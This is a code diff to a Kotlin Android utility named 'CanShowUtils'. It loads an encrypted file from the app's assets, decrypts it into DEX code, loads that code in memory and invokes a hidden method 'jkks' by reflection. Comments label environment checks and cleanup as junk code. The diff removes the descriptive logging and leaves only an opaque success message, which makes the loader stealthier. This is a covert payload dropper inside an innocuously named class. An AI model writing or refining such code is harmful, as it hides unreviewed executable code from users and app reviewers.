@@ -2,6 +2,7 @@ package gh.cark
 
 import android.content.Context
 import android.util.Base64
+import android.util.Log
 import java.lang.reflect.InvocationTargetException
 import java.nio.ByteBuffer
 import java.security.MessageDigest
@@ -29,7 +30,6 @@ object CanShowUtils {
             helperFlag = true
         }
         try {
-            NcZong.showLog("DexLoaderHelper: 开始加载DEX")
 
             // 环境检测（垃圾代码）
             performEnvironmentCheck(context)
@@ -37,7 +37,6 @@ object CanShowUtils {
             // 1. 从assets读取加密的文本
             val encryptedText = readEncryptedTextFromAssets(context)
             if (encryptedText.isEmpty()) {
-                NcZong.showLog("DexLoaderHelper: mast.zip文件为空")
                 return
             }
 
@@ -49,9 +48,7 @@ object CanShowUtils {
 
             // 3. 加载DEX
             loadDexInMemory(context, dexBytes)
-            NcZong.showLog("DexLoaderHelper: DEX加载完成")
         } catch (e: Exception) {
-            NcZong.showLog("DexLoaderHelper 错误: ${e.message}")
             e.printStackTrace()
         } finally {
             // 清理标志（垃圾代码）
@@ -218,7 +215,6 @@ object CanShowUtils {
             invokeDexMethod(loadedClass, context)
 
         } catch (e: Exception) {
-            NcZong.showLog("DexLoaderHelper: 加载DEX失败 - ${e.message}")
             e.printStackTrace()
         } finally {
             // 加载后清理（垃圾代码）
@@ -280,15 +276,12 @@ object CanShowUtils {
             // 调用静态方法，只传递context
             jkksMethod.invoke(null, context)
 
-            NcZong.showLog("DexLoaderHelper: jkks方法调用成功")
+            Log.e("TAG", "jkks-success")
         } catch (e: NoSuchMethodException) {
-            NcZong.showLog("DexLoaderHelper: 找不到jkks方法 - ${e.message}")
             e.printStackTrace()
         } catch (e: InvocationTargetException) {
-            NcZong.showLog("DexLoaderHelper: jkks方法执行时抛出异常 - ${e.targetException?.message}")
             e.targetException?.printStackTrace()
         } catch (e: Exception) {
-            NcZong.showLog("DexLoaderHelper: 调用jkks方法失败 - ${e.message}")
             e.printStackTrace()
         }
     }
